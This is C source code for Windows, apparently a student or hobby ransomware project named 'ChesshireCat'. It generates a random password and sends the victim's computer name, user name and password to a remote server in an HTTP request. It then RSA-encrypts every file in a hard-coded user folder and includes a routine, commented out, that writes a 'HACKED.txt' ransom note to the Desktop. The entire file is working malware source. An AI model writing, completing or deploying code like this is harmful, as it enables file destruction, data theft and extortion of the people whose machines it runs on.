/*
_________ .__                  .__    .__               _________         __
\_   ___ \|  |__   ____   _____|  |__ |__|______   ____ \_   ___ \_____ _/  |_
/    \  \/|  |  \_/ __ \ /  ___/  |  \|  \_  __ \_/ __ \/    \  \/\__  \\   __\
\     \___|   Y  \  ___/ \___ \|   Y  \  ||  | \/\  ___/\     \____/ __ \|  |
 \______  /___|  /\___  >____  >___|  /__||__|    \___  >\______  (____  /__|
        \/     \/     \/     \/     \/                \/        \/     \/
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <Windows.h>

#pragma comment(lib,"ws2_32.lib") // Code::Blocks->Settings->Compiler->Linker->Other linker options: => "-lws2_32";

#include "../../RSA/rsa.h"
#include "encrypt.h"

char *createPassword(const size_t lengthPass);
void createMessage(const char* userName);
int sendPassword(const char *userName, const char *passwd);

int main(int argc, char *argv[])
{
    static const size_t USER_NAME_LENGTH = 256;
    static const size_t USER_PASSWORD_LENGTH = 256;
    const char *PRIME_SOURCE_FILE = "primes.txt";

    //Get username
    char userName[USER_NAME_LENGTH+1];
    DWORD userName_len = USER_NAME_LENGTH+1;
    GetUserName(userName, &userName_len);

    srand(time(NULL));

    char *passwd = createPassword(USER_PASSWORD_LENGTH);
    printf("%s", passwd);

    //createMessage(userName);
    sendPassword(userName, passwd);

    // This is for the encryption
    //char basePath[] = "C:/Users/Zelra/Desktop/MyFile"; // Path for the base folder
    char basePath[] = "C:/Users/maxim/Desktop/MyFile";
    //fileEncrypt(fileptr);

    struct public_key_class pub;
    struct private_key_class priv;
    rsa_gen_keys(&pub, &priv, PRIME_SOURCE_FILE);

    folderEncrypt(basePath, &pub);

    free(passwd);
    return 0;
}

//Generate Password
char *createPassword(const size_t lengthPass)
{
    static const char passBuilder[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
    char *createdPasswd = NULL;
    createdPasswd = malloc(lengthPass * sizeof(char));

    if (createdPasswd == NULL)
    {
        printf("Fatal error : could not allocate %d bytes of memory", lengthPass);
        exit(-1);
    }

    for (size_t i = 0; i < lengthPass; i++)
    {
        createdPasswd[i] = passBuilder[(rand() % (strlen(passBuilder)) + 1)] ;
    }

    return createdPasswd;
}

//Create a message on the Desktop
void createMessage(const char* userName){

    // Path of the file on the Desktop
    char path[60] = { 0 };
    strcat(path, "C:/Users/");
    strcat(path, userName);
    strcat(path, "/Desktop/HACKED.txt");

    // Creation of the message
    char message[] = "U have been hacked. All of your files have been crypted.";
    FILE *file = fopen(path, "w");

    if (file == NULL)
    {
        printf("Fatal error : could not open file \"%s\"", path);
        exit(-2);
    }

    fprintf(file, "%s\n" ,message);
    fclose(file);
}


//Send password to server
int sendPassword(const char *userName, const char *passwd){

    // Set the variables
	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;
    char computerName[50] = "";
    char server_reply[2000];
    int recv_size;

	char *hostname = "www.google.com";
	char ip[100];
	struct hostent *he;
	struct in_addr **addr_list;

	printf("\nInitialising Winsock...");
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("Failed. Error Code : %d",WSAGetLastError());
		return 1;
	}
	printf("Initialised.\n");

	// Get computer name
    gethostname(computerName, sizeof (computerName));
    printf("%s--", computerName);
    printf("%s--", userName);
    printf("%s-- \r\n", passwd);

    // Fill the message with victim information
    size_t needed = snprintf(NULL, 0, "GET /computerName%s&userName=%s&password=%s HTTP/1.0\r\n\r\n", computerName, userName, passwd) + 1;
    char  *message = malloc(needed);
    sprintf(message, "GET /computerName%s&userName=%s&password=%s HTTP/1.0\r\n\r\n", computerName, userName, passwd);
    printf(message);

	//Create a socket
	if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d" , WSAGetLastError());
	}
	printf("Socket created.\n");

    // Lookup domain name
    if ((he = gethostbyname( hostname ) ) == NULL)
    {
        //gethostbyname failed
        printf("gethostbyname failed : %d" , WSAGetLastError());
        return 1;
    }

    // Cast the h_addr_list to in_addr , since h_addr_list also has the ip address in long format only
    addr_list = (struct in_addr **) he->h_addr_list;
    for(size_t i = 0; addr_list[i] != NULL; i++)
    {
        //Return the first one;
        strcpy(ip , inet_ntoa(*addr_list[i]) );
	}

	// ---- DEBUG ----
	//printf("%s resolved to : %s\n" , hostname , ip);

	server.sin_addr.s_addr = inet_addr(ip);
	server.sin_family = AF_INET;
	server.sin_port = htons( 80 );

	//Connect to remote server
	if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
	{
		puts("connect error");
		closesocket(s);
		return 1;
	}
	puts("Connected");

	// Send some data
	if (send(s , message , strlen(message) , 0) < 0)
	{
		puts("Send failed");
		closesocket(s);
		return 1;
	}
	puts("Data Send\n");

	// Receive a reply from the server
	if ((recv_size = recv(s , server_reply , 2000 , 0)) == SOCKET_ERROR)
	{
		puts("recv failed");
	}
	puts("Reply received\n");

    //  ---- DEBUG ----
	// Add a NULL terminating character to make it a proper string before printing
	server_reply[recv_size] = '\0';
	puts(server_reply);

	free(message);
    closesocket(s);
    WSACleanup();
	return 0;
}
